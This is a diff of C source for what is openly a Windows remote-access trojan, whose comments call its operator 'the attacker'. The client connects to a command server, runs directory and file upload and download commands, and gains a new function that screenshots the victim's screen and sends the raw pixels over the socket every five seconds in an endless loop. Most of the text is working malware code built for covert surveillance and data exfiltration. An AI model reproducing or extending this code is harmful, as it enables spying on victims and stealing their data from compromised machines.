@@ -41,6 +41,8 @@
 char currDir[MAX_PATH]; // name of the current directory
 SOCKET mainSock; // main socket used to receive commands and send info
 
+void test();
+
 // helper function for exiting on error
 void exitOnError() {
 	printf("Exiting program...\n");
@@ -266,6 +268,9 @@ void connectToCommandServer() {
 		printf("Connected to command server\n");
 	}
 
+	// TESTING TODO - remove once done testing
+	test();
+
 	// get and process commands from the attacker
 	do {
 		// get the next command and check for errors or a closed connection
@@ -284,16 +289,119 @@ void connectToCommandServer() {
 	// TODO - kill the connection gracefully
 }
 
+// TODO - remove once done using
+int frames = 0;
+void videoStreamTest() {
+	// code modified from https://stackoverflow.com/questions/3291167/how-can-i-take-a-screenshot-in-a-windows-application
+	// get the device context of the screen
+	HDC hScreenDC = GetDC(NULL);
+	// and a device context to put it in
+	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+
+	int width = GetDeviceCaps(hScreenDC, HORZRES);
+	int height = GetDeviceCaps(hScreenDC, VERTRES);
+
+	// maybe worth checking these are positive values
+	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+
+	// get a new bitmap
+	HBITMAP holdBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+
+	if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) {
+		printf("Error: %d\n", GetLastError());
+	}
+	hBitmap = (HBITMAP)SelectObject(hMemoryDC, holdBitmap);
+
+	// clean up
+	DeleteDC(hMemoryDC);
+	DeleteDC(hScreenDC);
+
+	// now your image is held in hBitmap. You can save it or do whatever with it
+	
+	// code from https://stackoverflow.com/questions/22572849/c-how-to-send-hbitmap-over-socket
+	BITMAP Bmp;
+	BITMAPINFO Info;
+	HDC DC = CreateCompatibleDC(NULL);
+	HBITMAP OldBitmap = (HBITMAP)SelectObject(DC, hBitmap);
+	GetObject(hBitmap, sizeof(Bmp), &Bmp);
+
+	Info.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+	Info.bmiHeader.biWidth = width = Bmp.bmWidth;
+	Info.bmiHeader.biHeight = height = Bmp.bmHeight;
+	Info.bmiHeader.biPlanes = 1;
+	Info.bmiHeader.biBitCount = Bmp.bmBitsPixel;
+	Info.bmiHeader.biCompression = BI_RGB;
+	int fileSize = ((width * Bmp.bmBitsPixel + 31) / 32) * 4 * height;
+	Info.bmiHeader.biSizeImage = fileSize;
+
+	char * Pixels = malloc(Info.bmiHeader.biSizeImage);
+	char * pRev = malloc(Info.bmiHeader.biSizeImage);
+	GetDIBits(DC, hBitmap, 0, height, &Pixels[0], &Info, DIB_RGB_COLORS);
+	SelectObject(DC, OldBitmap);
+	//height = height < 0 ? -height : height;
+	DeleteDC(DC);
+
+	//printf("Size of hbitmap: %d\n", sizeof(hBitmap));
+	printf("Display x & y: %d x %d\n", width, height);
+	
+	// send data
+	int bytesToSend = fileSize;
+	int bytesSent = 0;
+	int retCode;
+	int repeats = 0;
+
+	// send frame size if first frame
+	/*if (frames == 0) {
+		int* buff[1];
+		buff[0] = fileSize;
+		retCode = send(mainSock, buff, bytesToSend - bytesSent, 0);
+		if (retCode == SOCKET_ERROR) {
+			printf("Could not send data: %d\n", WSAGetLastError());
+			exitOnError();
+		}
+		frames++;
+	}*/
+
+	for (int row = 0; row < height; row++) {
+		for (int b = 0; b < width * 4; b++) {
+			int idx = ((height - row - 1) * width * 4) + b;
+			int rIdx = (row * width * 4) + b;
+			pRev[rIdx] = Pixels[idx];
+		}
+	}
+
+	for (int i = 0; i < fileSize; i += 4) {
+		char temp = pRev[i];
+		pRev[i] = pRev[i + 2];
+		pRev[i + 2] = temp;
+	}
+
+	// loop until all data is sent
+	do {
+		retCode = send(mainSock, pRev, bytesToSend - bytesSent, 0);
+		if (retCode == SOCKET_ERROR) {
+			printf("Could not send data: %d\n", WSAGetLastError());
+			exitOnError();
+		}
+		bytesSent += retCode;
+		if (bytesSent < bytesToSend) { // we need to loop again
+			printf("Could not send all data in one attempt! Looping to send remaining data...\n");
+			memmove(Pixels, (char*)(pRev + bytesSent), bytesToSend - retCode);
+			repeats++;
+		}
+	} while (bytesSent < bytesToSend + repeats);
+
+	free(Pixels);
+	free(pRev);
+}
+
 // TODO - remove testing function once no longer needed
+// currently testing video streaming to attacker server
 void test() {
-	char buffer[] = { CHANGE_DIR, 'C', ':', '\\', 'U', 's', 'e', 'r', 's', '\0' };
-	handleCommand(buffer);
-	char buffer2[] = {LIST_DIR, 'D', '\0' };
-	handleCommand(buffer2);
-	char buffer3[] = { UPLOAD, 127, 35, 'w', 'a', 'l', 'l', '.', 'p', 'n', 'g', '\0' };
-	handleCommand(buffer3);
-	char buffer4[] = { DOWNLOAD, 127, 35, 'w', 'a', 'l', 'l', '.', 'p', 'n', 'g', '\0' };
-	handleCommand(buffer4);
+	while (1 == 1) {
+		videoStreamTest();
+		Sleep(5000);
+	}
 }
 
 int main(int argc, char* argv[]) {
